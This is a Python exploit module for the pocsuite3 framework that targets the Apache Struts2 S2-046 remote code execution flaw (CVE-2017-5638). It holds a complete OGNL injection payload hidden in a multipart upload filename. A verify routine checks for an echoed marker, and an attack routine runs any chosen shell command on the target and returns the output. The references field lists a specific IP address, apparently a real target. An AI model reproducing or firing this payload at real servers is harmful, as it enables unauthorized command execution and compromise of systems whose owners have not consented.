# -*- coding:utf-8 -*-

from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, OptString, POC_CATEGORY
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str

class DemoPOC(POCBase):
    vulID = "CVE-2017-5638"
    version ='1'
    author = ["LMX"]
    vulDate = "2017-09-22"
    createDate = "2022-2-3"
    updateDate = "2022-2-3"
    references =["http://5.249.156.94:8080/etrackweb/loginAction.action"]
    name ="S2-046 Remote Code Execution Vulnerablity"
    appPowerLink = ''
    appName = 'Struts2'
    appVersion = '2.3.5-31, 2.5.0-10'
    vulType = 'RCE'
    desc = '''
    struts2-046远程代码执行漏洞
    '''
    
    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        result ={}
        boundary = "------WebKitFormBoundaryA2CGwp1IsuRmuBbG"
        content_type = "multipart/form-data; boundary=%s" % boundary
        payload = "--%s\r\n" % boundary
        payload += "Content-Disposition: form-data; name=\"upload\"; filename=\""
        payload += "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='echo testpoc')."
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}0\x00b\"\r\n"
        payload += "Content-Type: application/octet-stream\r\n\r\n\r\n--%s--\r\n\r\n" % boundary

        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'multipart/form-data; boundary=------WebKitFormBoundaryA2CGwp1IsuRmuBbG',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36'
                    }
        poc = payload
        r = requests.post(url=self.url,headers=headers,data=poc)
        #rr = requests.post(url=self.url,headers=headers,data=payload_2)
        #rrr = requests.post(url=self.url,headers=headers,data=payload_3)
        try:
            if r.status_code == 200 and 'testpoc' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):

        result ={}

        cmd = self.get_option("command")
        boundary = "------WebKitFormBoundaryA2CGwp1IsuRmuBbG"
        content_type = "multipart/form-data; boundary=%s" % boundary

        payload = "--%s\r\n" % boundary
        payload += "Content-Disposition: form-data; name=\"upload\"; filename=\""
        payload += "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='RECOMMAND')."
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}0\x00b\"\r\n"
        payload += "Content-Type: application/octet-stream\r\n\r\n\r\n--%s--\r\n\r\n" % boundary

        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'multipart/form-data; boundary=------WebKitFormBoundaryA2CGwp1IsuRmuBbG',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36'
                    }
        payload = payload.replace("RECOMMAND", cmd)

        try:
            response = requests.post(url=self.url, data=payload, headers=headers)
            if response and response.status_code == 200:
                result['Stdout'] = response.text
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)
        
register_poc(DemoPOC) 
